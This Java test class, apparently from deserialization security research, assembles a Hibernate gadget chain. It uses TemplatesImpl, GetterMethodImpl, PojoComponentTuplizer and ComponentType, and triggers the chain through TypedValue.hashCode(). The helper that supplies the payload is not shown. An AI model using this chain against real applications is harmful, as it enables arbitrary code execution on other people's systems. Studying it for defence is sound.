package com.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.hibernate.engine.spi.TypedValue;
import org.hibernate.property.access.spi.Getter;
import org.hibernate.property.access.spi.GetterMethodImpl;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.ComponentType;

import javax.xml.transform.Templates;
import java.io.IOException;

public class Test01 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Tools.getTemplatesImpl();
        GetterMethodImpl getterMethod = new GetterMethodImpl(Templates.class, "outputproperties", templates.getClass().getDeclaredMethod("getOutputProperties"));
        PojoComponentTuplizer o = (PojoComponentTuplizer) Tools.getObjectByUnsafe(PojoComponentTuplizer.class);
        Tools.setFieldValue(o, "getters", new Getter[]{getterMethod});
//        o.getPropertyValue(templates, 0);
        ComponentType o1 = (ComponentType) Tools.getObjectByUnsafe(ComponentType.class);
        Tools.setFieldValue(o1, "componentTuplizer", o);
        Tools.setFieldValue(o1, "propertySpan", 1);
        TypedValue typedValue = new TypedValue(o1, templates);
        typedValue.hashCode();
    }
}
